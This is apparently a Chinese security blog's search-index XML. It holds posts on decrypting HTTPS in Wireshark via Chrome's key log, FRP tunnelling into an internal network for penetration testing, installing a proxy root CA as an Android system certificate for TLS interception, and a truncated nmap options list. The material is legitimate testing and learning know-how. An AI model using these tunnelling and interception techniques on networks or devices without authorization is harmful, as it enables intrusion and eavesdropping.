<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MacOS中如何使用Wireshark抓取HTTPS流量包</title>
      <link href="/2023/10/22/MacOS%E4%B8%AD%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Wireshark%E6%8A%93%E5%8F%96HTTPS%E6%B5%81%E9%87%8F%E5%8C%85/"/>
      <url>/2023/10/22/MacOS%E4%B8%AD%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Wireshark%E6%8A%93%E5%8F%96HTTPS%E6%B5%81%E9%87%8F%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h2 id="问题提出"><a href="#问题提出" class="headerlink" title="问题提出"></a>问题提出</h2><p>最近有个工作需求是需要使用Wireshark抓取HTTP2的流量包，但是我直接抓取流量的时候只能看到未加密的HTTP和已加密的TLS。原因在于，Wireshark 是基于网络层的抓包工具，通过捕获通信双方的TCP&#x2F;IP包实现内容提取。对于应用层的数据，如果应用层协议是公开的，就可以直接显示数据。但是在处理HTTPS 协议时，因为不知道客户端、服务端的私钥，所以对应的数据不可见。 也就是说，如果 Wireshark 能够获取私钥，就能显示HTTPS的通信数据。</p><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310221022012.jpg" alt="202310221022012"></p><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p>以<code>Chrome</code>为例，mac中详细操作如下：</p><h3 id="1-查找浏览器"><a href="#1-查找浏览器" class="headerlink" title="1.查找浏览器"></a>1.查找浏览器</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo find / -iname <span class="string">&quot;Google Chrome&quot;</span></span><br></pre></td></tr></table></figure><p>可以找到binary所在路径为<code>/Applications/Google Chrome.app/Contents/MacOS/Google Chrome</code></p><h3 id="2-运行chrome并指定sslkey-logfile"><a href="#2-运行chrome并指定sslkey-logfile" class="headerlink" title="2. 运行chrome并指定sslkey logfile"></a>2. 运行chrome并指定sslkey logfile</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --ssl-key-log-file=/Users/`<span class="built_in">whoami</span>`/sslkeylog.log</span><br></pre></td></tr></table></figure><h3 id="3-启动Wireshark，并配置sslkey文件"><a href="#3-启动Wireshark，并配置sslkey文件" class="headerlink" title="3. 启动Wireshark，并配置sslkey文件"></a>3. 启动Wireshark，并配置sslkey文件</h3><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310221027131.png" alt="image-20231022102728794"></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>按理来说，这样配置之后就可以抓到HTTPS流量包了，但是在实际操作中，抓包的结果和配置之前没有区别。后来我看到一篇博客<a href="https://blog.csdn.net/weixin_45056784/article/details/120526640">Mac电脑配置完sslkey.log，但还是无法抓包HTTPS</a>，里面也遇到了相同的问题，给出的原因和解决措施如下。</p><p>上述操作创建log文件时使用的命令是：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --ssl-key-log-file=/Users/username/sslkeylog.log</span><br></pre></td></tr></table></figure><p>即以管理员的身份运行。这样创建的log文件其他应用程序是没有权限访问的，所以不用sudo，直接：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --ssl-key-log-file=/Users/username/sslkeylog.log</span><br></pre></td></tr></table></figure><p>重启Wireshark之后，问题成功解决，成功抓取到HTTP2流量包。</p><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310221032869.jpg" alt="HTTP2"></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FRP内网渗透</title>
      <link href="/2023/10/20/FRP%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/2023/10/20/FRP%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="FRP简介"><a href="#FRP简介" class="headerlink" title="FRP简介"></a>FRP简介</h2><p>FRP是一款用于内网穿透的高性能的反向代理应用，通过内网反向代理，可以实现从外网远程访问内网，进行远程渗透测试。FRP支持TCP、UDP、HTTP、HTTPS等多种协议，通过在具有公网 IP 的节点上部署 FRP 服务端，可以轻松地将内网服务穿透到公网。</p><p>项目地址：<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/fatedier/frp/">https://github.com/fatedier/frp/</a></p><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>使用一台工作电脑（处于外网），对一个处于内网的系统进行渗透测试。</p><p>如果直接将内网系统绑定到服务端的端口上进行访问，那么无疑是将内网系统暴露于公网之上，是非常不安全的。</p><p>为了安全性考虑，可以通过一个加密访问的代理服务，实现两个网段的互通。使用一台在公网上的IP服务器，对这两个不互通的网段进行流量中转，使它们能够进行间接性互通访问。<br><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310211458851.png" alt="image-20231021145811758" style="zoom:67%;" /></p><ul><li><a href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">云服务器</a>（对两个不互通的网段流量进行中转）</li><li>内网主机（存在web系统，不能被外网访问）</li><li>外网主机（开启中转代理，访问内网系统）</li></ul><p>参考链接： <a href="https://cloud.tencent.com/developer/article/2148875">https://cloud.tencent.com/developer/article/2148875</a></p><h3 id="服务器操作"><a href="#服务器操作" class="headerlink" title="服务器操作"></a>服务器操作</h3><p>首先，需要自己准备一台有<a href="https://cloud.tencent.com/product/eip?from_column=20065&from=20065">公网IP</a>的服务器，然后将FRP下载到服务器上，进入到FRP文件夹下，修改配置文件 <code>frps.ini</code> 如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0 </span><br><span class="line">bind_port = 7100     # 绑定服务器端口</span><br><span class="line">token = 123456789    # 自定义的配对密钥</span><br></pre></td></tr></table></figure><p>启动服务端FRP命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p> <img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310201234822.jpg" alt="服务端成功截图"></p><p>注意：服务器上相对应的端口7100和9876要对外开放。</p><h3 id="客户端操作"><a href="#客户端操作" class="headerlink" title="客户端操作"></a>客户端操作</h3><p>在内网任意一台主机上也需要下载FRP文件，进入FRP文件夹下，修改配置文件 <code>frpc.ini</code> 如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x # 服务器的IP</span><br><span class="line">server_port = 7100    # 服务器的绑定端口</span><br><span class="line">token = 123456789     # 服务器的配对密钥</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 9876    # 服务器的另一个端口</span><br><span class="line">plugin = http_proxy   # 设置为http代理</span><br></pre></td></tr></table></figure><p>启动客户端FRP命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\frpc.exe -c ./frpc.ini</span><br></pre></td></tr></table></figure><p>成功之后会有start proxy success截图，这里没有截。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>当服务器与内网主机都开启FRP后，在工作电脑（处于外网）的浏览器中设置服务器的frp_http代理，就可以访问内网服务了。</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310201232671.png" alt="浏览器代理" style="zoom:75%;" /><h2 id="一些坑"><a href="#一些坑" class="headerlink" title="一些坑"></a>一些坑</h2><ol><li>服务器上相对应的端口7100和9876要对外开放，否则，客户端连接时将会失败：</li></ol><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310201238227.png" alt="ca97fd91a4c61e1f36adc36bb9eedd96"></p><ol start="2"><li>.ini文件中不要写注释，不然会被当成域名解析：</li></ol><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310201239846.png" alt="cf92c05c506e5a686c24da10539fe939"></p><ol start="3"><li>关闭360安全卫士，否则可执行文件将不可用。</li></ol><h2 id="技术总结"><a href="#技术总结" class="headerlink" title="技术总结"></a>技术总结</h2><p>其实做这个工作的原因是同事想知道这种通过代理访问内网服务的方式能不能被防御人员发现，即这种行为会不会有特殊的标志。</p><p>一般来说，在HTTP 扩展头部中，X-Forwarded-For （XFF）请求标头是一个<strong>用于标识通过代理服务器连接到web 服务器的客户端的原始IP 地址的标头</strong>。因此，如果通过代理服务器访问内网服务，即在浏览器中添加代理后，在外网机器上访问内网服务时，XFF头会被自动添加到数据包中的话，那么就可以通过分析数据包中的XFF头标志，判断是否有恶意攻击者通过外网在访问内网服务。</p><p>但是，通过抓包分析发现，代理访问的这种模式下，数据包中并没有XFF头，因此上面提到的想法行不通。原因是XFF头一般是服务器主动添加的，而这里的模式是端口转发映射，不是web server多级代理的模式。（同事原话）XFF头没有被浏览器插件、正向代理插件 主动添加上去，通过XFF头检测行不通。</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>虽然最后这条检测链并不可行，但是这种想法还是很值得我学习的，安全人员至少需要对HTTP数据包中的每一个头部的功能非常熟悉，才有可能在面对新的问题的时候，找到检测或者防御的方式。</p><p>这也是我接触甲方安全的第一个case，和乙方不同的是，前者更注重各种攻击的检测和防御，判断各种漏洞的影响范围，并做出相应的应急响应。</p>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决部分APP无法抓包的问题</title>
      <link href="/2023/10/17/%E8%A7%A3%E5%86%B3%E9%83%A8%E5%88%86APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2023/10/17/%E8%A7%A3%E5%86%B3%E9%83%A8%E5%88%86APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在之前实习复测APP中的漏洞的时候，一般的流程是在模拟器中安装对应APP，模拟器中安装好BurpSuite（或其他代理抓包工具）的证书，然后配置好代理IP和端口后进行抓包。但是，在实际操作中，很多时候我需要的存在漏洞利用位置的数据包都抓不到，这个时候我的处理措施往往是换一个APP、换一个漏洞进行复测。但现在回想，这种做法既浪费了我的时间，又没弄懂为什么有的包会抓不到，即没有知识沉淀。</p><p>所以，最近我在网上学习了该问题的产生原因及解决措施，现总结如下。</p><p>主要参考：<a href="https://www.cnblogs.com/lulianqi/p/11380794.html#_label2">https://www.cnblogs.com/lulianqi/p/11380794.html#_label2</a></p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>其实不仅是在模拟器中安装的有些APP无法抓包，安装在真机中的有些APP使用Fiddler 或  Charles这类代理抓包软件默认情况下也无法抓取请求，但使用Wireshark这类网卡抓包软件却可以看到这些APP的流量，这些流量也表明这些APP使用的主要应用层协议仍然是HTTP（https），但是我们的代理抓包工具却失效了。</p><p>为了弄明白为什么失效，我们需要先了解一下代理抓包的原理（这部分感觉参考博客讲的很清晰）。</p><h3 id="代理抓包原理"><a href="#代理抓包原理" class="headerlink" title="代理抓包原理"></a>代理抓包原理</h3><p>Fiddler 或 Charles 这类使用的代理的抓包软件与Wireshark是完全不同的（Wireshark  使用的网卡数据复制，只要是经过指定网卡都会被抓取），其只能对使用代理的应用层网络协议生效，比如常见的HTTP（https），Websocket  。</p><p>这里以HTTP为例简单说明下：（借用参考博客图，个人博客的主要目的是记录和总结，无意传播什么，如有侵权会删除）</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310171443777.png" alt="img" style="zoom:67%;" /> <p>客户端需要完成一次HTTP请求，通常需要先找到目标服务器，客户端会根据HTTP请求中URL的主机名（实际会使用host中的主角名）及其端口与目标主机建立TCP连接（如图，三次握手），建立连接后会将HTTP报文发送给目标服务器。</p><p> <strong>那么，在使用HTTP代理服务器时HTTP代理是如何运作的呢？</strong></p><p>当我们启动Fiddler 或  Charles就是启动了一个HTTP代理服务器，这类工具会通知操作系统，”现在我在系统上创建了一个HTTP代理，IP为XXXXXX端口为XX。如果您使用的是Linux您可以手动通知操作系统(export http_proxy&#x3D;ip:port export  https_proxy&#x3D;$http_proxy)，如果您使用的是手机等移动设备您可以在当前wifi设置处告诉系统你要使用HTTP代理。”</p><p>现在我们已经告诉系统我们想要使用代理，这个时候运行在系统上的HTTP客户端再去发送请求的时候，就不会再去进行DNS解析，去连接目标服务器，而是直接连接系统告诉它代理所在的地址（代理的IP及端口，注意无论是HTTP或HTTPS或其他支持代理的协议都会连接同一个端口）。然后代理服务器会与客户端建立连接，再然后代理服务器根据请求信息再去连接真正的服务器。（判断逻辑如下图）</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310171449100.png" alt="img"  /><p><strong>细节：</strong>正常在没有代理的情况下客户端向服务器发送的请求行里只包含部分URI（实际上是没有方案、主机名及端口的）</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310171450302.png" alt="img" style="zoom:67%;" /><p>如上图如果在没有代理的情况下，对<code> www.baidu.com/index.html</code>的请求的请求行实际上是<code>GET /index.html  HTTP/1.1</code>  ，而并不是我们常见的完整URI。因为在原始的HTTP设计中没有考虑中间服务器（即代理）的情况，客户端在发送报文前已经知道服务器的地址并与之建立了连接，没有必要再发送方案、主机名及端口。不过代理出现后这种做法就会有问题了，<strong>客户端连接了代理服务器，而代理服务器却没有办法连接正确的服务器。</strong>因此客户端发送给代理的请求其实稍有不同，客户端会在请求行里使用完整的URL，这样代理服务器才能解析真实的服务器的地址。</p><p>现在我们的请求实际上都是通过代理服务器（Fiddler 或 Charles）发送出去的，所以代理抓包软件不仅知道HTTP请求及响应的所有报文，甚至还可以随时修改请求及响应。</p><h2 id="部分APP不能抓包的原因"><a href="#部分APP不能抓包的原因" class="headerlink" title="部分APP不能抓包的原因"></a>部分APP不能抓包的原因</h2><p>可以看到代理抓包的关键就是需要HTTP客户端按照要求去连接代理服务器，一般情况下我们已经在系统层面上设置了代理，通常HTTP客户端都是按要求去实现的，在进行HTTP请求前会先检查系统代理，如果有设置代理，客户端会直接使用完整URI去连接代理服务器。不同的平台通常会实现自己的的HTTP客户端，<strong>虽然他们都按照协议要求实现了代理功能，但是并不一定在默认情况下会直接使用系统代理。</strong></p><p>正是因为HTTP客户端没有使用我们设置的系统代理，它们自然也不会连接Fiddler 或 Charles创建的代理服务器，最终导致我们无法获取任何请求。</p><h2 id="解决措施"><a href="#解决措施" class="headerlink" title="解决措施"></a>解决措施</h2><p>既然我们已经知道了Fiddler 和 Charles不能抓包的具体原因，前面也提到了代理抓包的原理，那我们就可以想办法解决。</p><p><strong>前面说到了我们APP使用的HTTP客户端没有连接到代理服务器，导致我们的代理抓包软件无法正常抓包，那我们只要想办法让客户端重新连接到代理服务器就好了（当然这一切都是以不修改客户端软件APP为前提的）。</strong></p><ul><li><p>方法1：控制DNS解析，通过修改DNS的方式让客户端以为我们的代理服务器就是目标服务器。</p><ul><li>优势：操作方便，通过修改设备的hosts可以十分方便的首先</li><li>劣势：需要为每个需要操作的域名提前添加host，在手机等手持设备上难以修改hosts（即对移动APP这类应用很难实现）</li></ul></li><li><p>方法2：在网络设备上直接做流量转发，将指定终端设备上发往80及443端口的数据直接转发到代理服务器的 目标端口上</p><ul><li>优势：可以针对连接到网络设备上的终端设备进行分别配置，而手机等终端设备不需要进行任何设备</li><li>劣势：需要单独的硬件设备</li></ul></li><li><p>方法3：使用VPN将终端设备的流量转发到代理服务器</p><ul><li>优势：使用VPN软件不用添加其他测试</li><li>劣势：终端上的VPN默认会直接对所有流量进行转发，要进行合理的配置可能需要额外的学习成本</li></ul></li></ul><h3 id="实际操作步骤-Android"><a href="#实际操作步骤-Android" class="headerlink" title="实际操作步骤(Android)"></a>实际操作步骤(Android)</h3><p>参考博客里直接使用上面提到第3种方法（方法1在对于手机APP很难操作，方法2可能需要其他设备所以这里不使用），因为我们的测试对象是手机移动APP，所以我们首先要在手机上安装一个VPN，这里使用一个十分方便的VPN软件drony （介绍在这里<a href="https://github.com/SuppSandroB/sandrop/wiki/Drony-FAQ%EF%BC%89%EF%BC%8Cdrony%E4%BC%9A%E5%9C%A8%E4%BD%A0%E7%9A%84%E6%89%8B%E6%9C%BA%E4%B8%8A%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAVPN%EF%BC%8C%E5%B0%86%E6%89%8B%E6%9C%BA%E4%B8%8A%E7%9A%84%E6%89%80%E6%9C%89%E6%B5%81%E9%87%8F%E9%83%BD%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0drony%E8%87%AA%E8%BA%AB%EF%BC%88%E4%B8%8D%E6%98%AF%E6%B5%81%E5%90%91vpn%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89">https://github.com/SuppSandroB/sandrop/wiki/Drony-FAQ），drony会在你的手机上创建一个VPN，将手机上的所有流量都重定向到drony自身（不是流向vpn服务器）</a> ，这样drony就可以管理所有手机上的网络流量，甚至可以对手机上不同APP的流量进行单独配置。</p><p>关于如何在手机上安装和配置drony这里先略过，等我实际使用到的时候再看情况补充。关于如何设置在网上也能看到很多参考帖子。</p><p>解决了vpn的问题后，还有一个关键步骤即在手机上安装Fiddler根证书，这样经过drony的流量才会被转发到Fiddler上。</p><p>但是，即使流量已经到Fiddler了，部分APP依然不能解密HTTPS报文，这其实还是我们自己证书的问题。下面先简单描述下证书校验的过程。</p><h4 id="证书校验原理"><a href="#证书校验原理" class="headerlink" title="证书校验原理"></a>证书校验原理</h4><p>无论Fiddler 或 Charles都使用中间人攻击的方式替换TLS链路证书，解密报文然后再加密发送给真实服务器。</p><p>关于中间人攻击的细节可以参看： <a href="https://www.cnblogs.com/lulianqi/p/10558719.html">HTTPS中间人攻击实践（原理·实践）</a></p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310171507387.png" alt="img" style="zoom:67%;" /><p>存在代理的情况下客户端首先连接的是代理服务器（即是图中的攻击者），实际Client是直接与Proxy建立的TLS通道，所以代理当然TLS通道的传输密钥然后解密报文。</p><p>不过由于证书的存在，Client会校验证书的合法性，然后决定是否连接服务器。我们使用Fiddler或Charles抓取HTTPS前在设备中安装根证书正是为了通过Client的证书校验（安装根证书的目的）。</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310171509672.png" alt="img" style="zoom: 87%;" /><p>在浏览器中任意找一个HTTPS的网页，查看其证书信息。</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310171510973.png" alt="img" style="zoom:87%;" /> <p>从这里面我们能看到证书包含以下内容：</p><p>(1) Validity也即有效期，有效期包含生效时间和失效时间，是一个时间区间；</p><p>(2) 公钥信息Subject Public Key Info，包括公钥的加密算法和公钥内容；</p><p>(3) 指纹信息，指纹用于验证证书的完整性，也是证书校验的关键，他保证书没有被修改过。  其原理就是在发布证书时，发布者根据指纹算法(此处证书使用了SHA-1和SHA-256算法  有多个指纹是为了兼容老的客户端)计算整个证书的hash指纹【证书内容hash值使用CA私钥加密就是指纹】并和证书放在一起，client在打开证书时，自己也根据指纹算法计算一下证书的hash值，同时使用自己信任的根证书的公钥解密hash指纹计算出原始hash，如果hash值不一致，则表明证书内容被篡改过；</p><p>(4) 证书的签名Certificate Signature Value和Certificate Signature Algorithm，对证书签名所使用的Hash算法和Hash值；</p><p>(5) 签发该证书的CA机构Issuer；</p><p>(6) 该证书是签发给哪个组织&#x2F;公司信息Subject；</p><p>(7) 证书版本Version、证书序列号Serial Number以及Extensions扩展信息等。</p><p><strong>证书校验的过程中：</strong></p><p>Client校验证书的核心其实是CA公钥解密原始指纹，CA公钥从哪里来，为了确保安全设备系统会有一批自己信任的CA公钥列表（根证书）。这些CA公钥对应的一般是权威机构或组织，然后由这些权威机构颁发证书时会使用他们自己的私钥去签名（为证书生成指纹）。这样就确保了只有权威机构颁发给各个网站的证书才会被客户端校验通过。</p><p>Filddler没有这些证书里公钥对应的私钥（CA只会把为完整颁发的证书对应的私钥给网站的所有者），所以没有办法与客户端完成TLS握手。Filddler为了完成握手只能自己为不同的站点生成证书。</p><p>不过自己的生成的证书肯定是用自己的私钥签名的，客户端在自己信任的CA公钥列表找不到对应根证书，肯定是不能通过证书校验的。所以Filddler要求我们安装他的根证书到设备，这样自己签发的证书就可以通过证书校验，自己就能解密HTTPS报文了。</p><h4 id="不能解密的原因"><a href="#不能解密的原因" class="headerlink" title="不能解密的原因"></a>不能解密的原因</h4><p>通过上面的描述可以发现不能正常建立连接解密HTTPS报文的原因就是证书校验失败，我们的根证书安装不够完全。</p><p>从Android7.0以后，系统允许每个应用可以定义自己的<a href="https://developer.android.com/training/articles/security-config#CustomTrust">可信CA集</a>。<strong>有部分应用默认只会信任系统预装的CA证书，而不会信任用户安装的CA证书</strong>（或者说是应用使用的开发框架默认只信任系统证书，因为开发者通常不关心这些配置，也不会去更改他）。而在Android中用户安装的证书都是用户证书，所以无论是Filddler还是Charles我们都只是把他们的根证书安装到了用户证书，这些应用并不使用他们，所以我们的安装的证书是无效的。 </p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310171513226.png" alt="img" style="zoom:87%;" /><h4 id="解决方法及操作方法"><a href="#解决方法及操作方法" class="headerlink" title="解决方法及操作方法"></a>解决方法及操作方法</h4><p>我们只要把代理软件的根证书安装成系统证书就可以了。</p><p>实际上将证书安装到系统区操作还是相对简单的，将证书用指定的名称放到指定的位置（&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;）就可以了</p><p>先将我们的根证书名称改为<Certificate_Hash>.<Number></p><p>Certificate_Hash表示证书文件的hash值，Number是为了防止证书文件的hash值一致而增加的后缀（用0就行了）</p><p>下载自己的根证书FiddlerRoot.cer，使用openssl x509 -subject_hash_old -in  <Certificate_File> 计算证书hash ，根据hash将证书重命名为 269953fb.0  （269953fb是参考博客笔者证书的hash，大家的肯定不一样）</p><p>然后将269953fb.0文件复制到&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310171514587.png" alt="img" style="zoom:87%;" /><p>完成后我们就可以看到代理软件的证书出现在系统区了。</p><p>这里还有一点需要单独说明，&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;目录的写权限，需要手机root权限。</p><p>也就是说复制证书到该目录需要您root自己的设备。</p><p>关于Android手机的root，通常手机厂家都会有自己官方的教程，建议大家按官方的操作进行root。</p><h3 id="IOS设备操作步骤（IOS）"><a href="#IOS设备操作步骤（IOS）" class="headerlink" title="IOS设备操作步骤（IOS）"></a>IOS设备操作步骤（IOS）</h3><p>IOS（iphone）同样使用上面提到第3种方法（原理与Android是一致的），同样需要使用到VPN，在IOS也有许多与drony功能类似的软件，大家可以自己选择自己喜欢的使用，笔者这里使用的是Shadowrocket。</p><p>为了完成流量重新定向，Shadowrocket与drony一样会先在设备上创建本地VPN服务，再使用您设置的规则处理流量。</p><p>不过Shadowrocket的使用会更加方便，直接打开软件如下图配置即可：</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310171517821.png" alt="img" style="zoom:50%;" /><ol><li>选择全局路由为「代理」</li><li>添加服务节点（类型选择HTTP及HTTPS ，服务器地址及端口为您代理抓包工具的地址与端口）</li><li>设置状态为启用 （IOS会同时自动创建VPN）</li></ol><p>现在直接打开iphone上的任意APP（不用再在wifi上重复设置代理）  ，既可以在代理抓包工具上看到流量了，同样不能解析HTTPS的流量，不过IOS并没有像新版的Android一样可以让APP拒绝用户手动信任的用户根证书，所以IOS证书安装IOS也比Android任意的多，并没有这么多额外的操作，按正常证书安装流程操作即可。</p><p><strong>证书安装完成后即可查看HTTPS流量：</strong></p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202310171520874.png" alt="img" style="zoom:67%;" /><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>其实这个问题也是我在面试中被问到的高频问题，我答不出来的根本原因还是因为自己的逃避心理以及一味追求“完成工作”，当时面对这个问题的时候只想着使用最快的方式绕过这个问题，而没有深入了解为什么以及怎么做。有时候我也会觉得自己实际上有很多机会扩充自己的知识面，只是都被我忽略了。当然，想要改变这种“偷懒心理”并不是一朝一夕的事情，因此我现在也只能先花时间把几个主要痛点解决，然后在日常的工作学习中慢慢培养钻研精神。</p>]]></content>
      
      
      <categories>
          
          <category> 原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> app </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap探测端口开放的原理</title>
      <link href="/2023/10/04/nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%E7%9A%84%E5%8E%9F%E7%90%86/"/>
      <url>/2023/10/04/nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%E7%9A%84%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>Nmap（ Network Mapper）是一个用于网络探索和安全审计的开源工具，可用于快速扫描大型网络，使用原始 IP 数据包来确定网络上可用的主机、这些主机提供的服务（应用程序名称和版本）、它们运行的操作系统（和操作系统版本）、正在使用的数据包过滤器&#x2F;防火墙的类型等。</p><p>nmap官方文档：<a href="https://nmap.org/book/">https://nmap.org/book/</a></p><h2 id="nmap的选项摘要"><a href="#nmap的选项摘要" class="headerlink" title="nmap的选项摘要"></a>nmap的选项摘要</h2><p>nmap的选项摘要：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Nmap 7.93SVN ( https://nmap.org )</span><br><span class="line">用法：nmap [扫描类型] [选项] &#123;目标规范&#125;</span><br><span class="line">目标规格：</span><br><span class="line">  可以传递主机名、IP 地址、网络等。</span><br><span class="line">  例如：scanme.nmap.org、microsoft.com/24、192.168.0.1；10.0.0-255.1-254</span><br><span class="line">  -iL &lt;输入文件名&gt;：来自主机/网络列表的输入</span><br><span class="line">  -iR &lt;num Hosts&gt;：选择随机目标</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: 排除主机/网络</span><br><span class="line">  --excludefile &lt;exclude_file&gt;：从文件中排除列表</span><br><span class="line">主机发现：</span><br><span class="line">  -sL：列表扫描 - 只需列出要扫描的目标</span><br><span class="line">  -sn：Ping 扫描 - 禁用端口扫描</span><br><span class="line">  -Pn：将所有主机视为在线--跳过主机发现</span><br><span class="line">  -PS/PA/PU/PY[端口列表]：给定端口的 TCP SYN/ACK、UDP 或 SCTP 发现</span><br><span class="line">  -PE/PP/PM：ICMP 回显、时间戳和网络掩码请求发现探测</span><br><span class="line">  -PO[协议列表]：IP协议Ping</span><br><span class="line">  -n/-R：从不进行 DNS 解析/始终解析 [默认值：有时]</span><br><span class="line">  --dns-servers &lt;serv1[,serv2],...&gt;: 指定自定义 DNS 服务器</span><br><span class="line">  --system-dns：使用操作系统的 DNS 解析器</span><br><span class="line">  --traceroute：跟踪每个主机的跃点路径</span><br><span class="line">扫描技术：</span><br><span class="line">  -sS/sT/sA/sW/sM：TCP SYN/Connect()/ACK/Window/Maimon 扫描</span><br><span class="line">  -sU：UDP扫描</span><br><span class="line">  -sN/sF/sX：TCP Null、FIN 和 Xmas 扫描</span><br><span class="line">  --scanflags &lt;flags&gt;: 自定义 TCP 扫描标志</span><br><span class="line">  -sI &lt;僵尸主机[:probeport]&gt;：空闲扫描</span><br><span class="line">  -sY/sZ：SCTP INIT/COOKIE-ECHO 扫描</span><br><span class="line">  -sO：IP协议扫描</span><br><span class="line">  -b &lt;FTP中继主机&gt;：FTP反弹扫描</span><br><span class="line">端口规格和扫描顺序：</span><br><span class="line">  -p &lt;端口范围&gt;：仅扫描指定端口</span><br><span class="line">    例如：-p22；-p1-65535；-p U:53,111,137,T:21-25,80,139,8080,S:9</span><br><span class="line">  --exclude-ports &lt;端口范围&gt;：从扫描中排除指定端口</span><br><span class="line">  -F：快速模式 - 扫描比默认扫描更少的端口</span><br><span class="line">  -r：按顺序扫描端口 - 不要随机化</span><br><span class="line">  --top-ports &lt;number&gt;: 扫描 &lt;number&gt; 个最常见端口</span><br><span class="line">  --port-ratio &lt;ratio&gt;：扫描比&lt;ratio&gt;更常见的端口</span><br><span class="line">服务/版本检测：</span><br><span class="line">  -sV：探测开放端口以确定服务/版本信息</span><br><span class="line">  --version-intensity &lt;level&gt;: 设置从 0 (light) 到 9 (尝试所有探针)</span><br><span class="line">  --version-light：限制最有可能的探测（强度 2）</span><br><span class="line">  --version-all：尝试每个探针（强度 9）</span><br><span class="line">  --version-trace：显示详细的版本扫描活动（用于调试）</span><br><span class="line">脚本扫描：</span><br><span class="line">  -sC：相当于--script=default</span><br><span class="line">  --script=&lt;Lua 脚本&gt;: &lt;Lua 脚本&gt; 是逗号分隔的列表</span><br><span class="line">           